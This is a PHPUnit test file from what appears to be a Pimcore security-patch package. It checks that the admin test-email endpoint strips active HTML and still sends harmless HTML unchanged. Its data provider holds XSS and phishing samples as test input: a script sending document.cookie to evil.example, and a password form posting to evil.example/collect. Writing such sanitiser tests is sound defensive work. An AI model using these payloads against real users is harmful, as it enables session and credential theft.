<?php

declare(strict_types=1);

namespace Portadesign\PimcoreSecurityPatches\Tests;

#[\PHPUnit\Framework\Attributes\Group('CVE-2025-30166')]
final class TestMailHtmlTest extends \PHPUnit\Framework\TestCase
{
    use \Portadesign\PimcoreSecurityPatches\Tests\Support\AdminUserSession;
    use \Portadesign\PimcoreSecurityPatches\Tests\Support\P5Environment;
    use \Portadesign\PimcoreSecurityPatches\Tests\Support\P5MailCapture;

    private const USERNAME = 'pd-sec-testmail-user';

    private const RESTRICTED_USERNAME = 'pd-sec-testmail-restricted';

    private \Pimcore\Model\User $user;

    private \Pimcore\Model\User $restrictedUser;

    protected function setUp(): void
    {
        $this->deleteUserByName(self::USERNAME);
        $this->deleteUserByName(self::RESTRICTED_USERNAME);
        $this->user = $this->createAccount(self::USERNAME, 'testmail-admin@example.test', ['emails']);
        $this->restrictedUser = $this->createAccount(self::RESTRICTED_USERNAME, 'testmail-restricted@example.test', []);
        $this->authenticate($this->user);
        $this->captureMails();
    }

    protected function tearDown(): void
    {
        $this->releaseMails();
        $this->authenticate(null);
        $this->deleteUserByName(self::USERNAME);
        $this->deleteUserByName(self::RESTRICTED_USERNAME);
    }

    /**
     * @return array<string, array{string, list<string>, list<string>}>
     */
    public static function activeContentProvider(): array
    {
        return [
            'credential form' => [
                '<p>Your session expired.</p><form action="https://evil.example/collect" method="post"><label>Password</label><input type="password" name="pass"><button type="submit">Sign in</button></form>',
                ['<form', '<input', '<button', 'evil.example/collect'],
                ['Your session expired.'],
            ],
            'script element' => [
                '<p>Hello</p><script>document.location="https://evil.example/?c="+document.cookie</script>',
                ['<script', 'document.cookie', 'evil.example'],
                ['Hello'],
            ],
            'event handler attribute' => [
                '<p>Hello</p><img src="https://example.test/a.png" onerror="alert(1)">',
                ['onerror', 'alert(1)'],
                ['Hello', 'https://example.test/a.png'],
            ],
            'javascript url' => [
                '<p>Hello</p><a href="javascript:alert(1)">Click</a>',
                ['javascript:', 'alert(1)'],
                ['Hello', 'Click'],
            ],
            'iframe' => [
                '<p>Hello</p><iframe src="https://evil.example/frame"></iframe>',
                ['<iframe', 'evil.example'],
                ['Hello'],
            ],
            'select and textarea' => [
                '<p>Hello</p><select name="s"><option>one</option></select><textarea name="t">x</textarea>',
                ['<select', '<option', '<textarea'],
                ['Hello'],
            ],
        ];
    }

    /**
     * @param list<string> $forbidden
     * @param list<string> $kept
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('activeContentProvider')]
    public function testActiveContentIsRemovedFromTheHtmlBody(string $content, array $forbidden, array $kept): void
    {
        $this->sendHtml($content);

        $this->assertCount(1, $this->sentMails);
        $html = $this->sentMails[0]['html'];
        foreach ($forbidden as $needle) {
            $this->assertFalse(false !== stripos($html, $needle), 'html body still contains ' . $needle);
        }
        foreach ($kept as $needle) {
            $this->assertTrue(false !== strpos($html, $needle), 'html body lost ' . $needle);
        }
    }

    /**
     * @return array<string, array{string}>
     */
    public static function harmlessHtmlProvider(): array
    {
        return [
            'heading and paragraph' => ['<h1>Newsletter</h1><p>Plain <strong>text</strong> and <em>emphasis</em>.</p>'],
            'https link' => ['<p><a href="https://example.test/page?a=1&amp;b=2">Read more</a></p>'],
            'https image' => ['<p><img src="https://example.test/logo.png" alt="Logo" width="120"></p>'],
            'table' => ['<table><tbody><tr><th>Item</th><th>Price</th></tr><tr><td>Book</td><td>9</td></tr></tbody></table>'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('harmlessHtmlProvider')]
    public function testControlHarmlessHtmlIsSentUnchanged(string $content): void
    {
        $mail = new \Pimcore\Mail();
        $mail->html($content);
        $mail->to('testmail-recipient@example.test');
        $mail->send();
        $this->assertCount(1, $this->sentMails);
        $unfiltered = $this->sentMails[0]['html'];

        $this->sentMails = [];
        $this->sendHtml($content);

        $this->assertCount(1, $this->sentMails);
        $this->assertSame($unfiltered, $this->sentMails[0]['html']);
    }

    public function testControlTextMailIsSentVerbatim(): void
    {
        $this->sendMail(['emailType' => 'text', 'content' => '<script>alert(1)</script> plain']);

        $this->assertCount(1, $this->sentMails);
        $this->assertSame('<script>alert(1)</script> plain', $this->sentMails[0]['text']);
    }

    public function testControlUserWithoutEmailsPermissionIsDenied(): void
    {
        $this->authenticate($this->restrictedUser);

        $this->expectException(\Exception::class);
        $this->expectExceptionMessage("Permission denied, user needs 'emails' permission.");

        $this->sendHtml('<p>Hello</p>');
    }

    private function sendHtml(string $content): void
    {
        $this->sendMail(['emailType' => 'html', 'content' => $content]);
    }

    /**
     * @param array<string, string> $parameters
     */
    private function sendMail(array $parameters): void
    {
        $request = \Symfony\Component\HttpFoundation\Request::create(
            uri: '/admin/email/send-test-email',
            method: 'POST',
            parameters: $parameters + ['to' => 'testmail-recipient@example.test', 'from' => 'testmail-sender@example.test', 'subject' => 'Test'],
        );

        $this->adminController(\Pimcore\Bundle\AdminBundle\Controller\Admin\EmailController::class)->sendTestEmailAction($request);
    }
}
